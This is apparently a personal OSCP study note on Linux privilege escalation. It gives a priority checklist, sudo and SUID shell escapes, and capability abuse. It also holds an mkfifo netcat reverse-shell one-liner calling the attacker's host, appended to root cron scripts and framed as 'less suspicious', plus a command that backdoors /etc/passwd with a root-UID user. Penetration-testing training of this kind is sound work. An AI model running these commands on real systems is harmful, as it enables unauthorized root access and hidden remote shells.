---
title: "Linux PrivEsc — Decision Tree and Mental Model"
created: "2026-04-05"
type: permanent-note
status: active
tags:
  - permanent-note
  - linux
  - privilege-escalation
  - methodology
  - oscp
---

# Linux PrivEsc — Decision Tree and Mental Model

**Core idea:** Linux PrivEsc is a layered enumeration problem. You work from easiest/fastest (sudo misconfig, SUID GTFOBins) to hardest (kernel exploits). The single most important habit is running `sudo -l` immediately — many boxes are solved in one command. After that, LinPEAS surfaces everything else. GTFOBins is always open in a browser tab.

---

## The Priority Order

```
1. sudo -l                    → fastest possible root (one command, one GTFOBin)
2. SUID binaries              → find / -perm -u=s → GTFOBins
3. Linux capabilities         → getcap -r / → cap_setuid+ep = root
4. Writable cron scripts      → grep CRON /var/log/syslog → append reverse shell
5. Credentials in env / files → env, .bashrc, config files, watch ps
6. Writable /etc/passwd       → add root2 with openssl hash
7. Writable /etc/shadow       → replace root hash
8. Kernel exploit             → last resort — uname -r → searchsploit → compile
```

---

## The sudo -l Mental Model

`sudo -l` doesn't just show root commands — it's a **GTFOBins lookup trigger**. For every binary listed, immediately check GTFOBins for a shell escape.

**Common sudo escapes:**

| Binary | Escape Method |
|--------|--------------|
| `apt-get` | `sudo apt-get changelog apt` → in pager → `!/bin/sh` |
| `vim` / `vi` | `sudo vim -c ':!/bin/sh'` |
| `find` | `sudo find / -exec /bin/sh \; -quit` |
| `python` | `sudo python -c 'import os; os.system("/bin/sh")'` |
| `less` | `sudo less /etc/passwd` → `!/bin/sh` |
| `nmap` | `sudo nmap --interactive` → `!sh` |
| `awk` | `sudo awk 'BEGIN {system("/bin/sh")}'` |
| `tcpdump` | `-z` flag → blocked by AppArmor on many systems |

> **Rule:** If you can run ANY binary as sudo, check GTFOBins before trying complex exploits. Half the OSCP Linux boxes are solved at `sudo -l`.

---

## SUID vs Capabilities — What's the Difference?

Both allow running code with elevated privileges — but the mechanism differs:

**SUID:** The binary *always* runs as its owner (usually root). The permission is set on the file.
```bash
ls -la /usr/bin/passwd
# -rwsr-xr-x  ← 's' in owner execute = SUID
```

**Capabilities:** A binary is given *specific* root powers without full root access. More granular, but `cap_setuid+ep` is effectively as powerful as SUID.
```bash
getcap /usr/bin/perl
# /usr/bin/perl = cap_setuid+ep  ← can call setuid(0) = become root
```

**The attack is identical:** find the binary → GTFOBins → run the escape.

---

## The Cron Abuse Pattern

Root runs a script on a timer. You can write to the script. You own root.

```
grep "CRON" /var/log/syslog     → find what root is executing
ls -la /path/to/script.sh        → check if world-writable (-rwxrwxrw-)
echo "<reverse_shell>" >> script → append payload (don't overwrite — less suspicious)
nc -lnvp PORT                    → wait up to 60 seconds for cron to fire
```

**Why append, not overwrite:** If the original cron script fails entirely, an admin might notice. Appending means the original script still runs — your reverse shell is just a bonus line at the end.

**The mkfifo reverse shell** is reliable because it creates a bidirectional pipe — commands sent via netcat are executed by `/bin/sh`, and the output goes back through netcat:
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc KALI_IP PORT >/tmp/f
```

---

## The /etc/passwd Trick — Why It Works

Linux has two files for authentication:
- `/etc/passwd` — usernames, UIDs, GIDs, home directories, shells
- `/etc/shadow` — actual password hashes (restricted to root)

The `x` in the password field of `/etc/passwd` means "look in shadow." **But if you put a real hash there, Linux uses it directly — shadow is never checked.**

This means: world-writable `/etc/passwd` → add any user with any UID and any password → instant root, no shadow needed.

```bash
openssl passwd w00t                              # generate hash: Fdzt.eqJQ4s0g
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2   # Password: w00t → root
```

---

## Kernel Exploit — When to Use It

Kernel exploits are **last resort** because:
1. They can crash/panic the system (bad for OSCP exam)
2. They require exact version matching
3. They take time to compile and transfer

**Use kernel exploits when:** everything else fails AND you've confirmed the kernel version matches a known CVE with a stable PoC.

**Compile on target when possible** — different systems have different `glibc` versions and kernel headers. A binary compiled on Kali may segfault on the target. Transfer the `.c` source, compile with `gcc` on the target itself.

---

## Three Commands That Solve Most Linux Boxes

```bash
sudo -l                           # sudo misconfig → GTFOBins
find / -perm -u=s -type f 2>/dev/null  # SUID → GTFOBins
/usr/sbin/getcap -r / 2>/dev/null      # capabilities → cap_setuid
```

Run these before LinPEAS. If none work → run LinPEAS and go deeper.

---

## Connections

- [[PWK-Module-18-Linux-PrivEsc]] — full module with all commands, examples, output, and AppArmor notes
- [[PWK-Module-17-Windows-PrivEsc]] — Windows equivalent; same priority-based approach
- [[PWK-Module-16-Password-Attacks]] — /etc/shadow hashes cracked with hashcat mode 1800
- GTFOBins is the single most important external resource for Linux PrivEsc

---

*From: PWK Module 18*
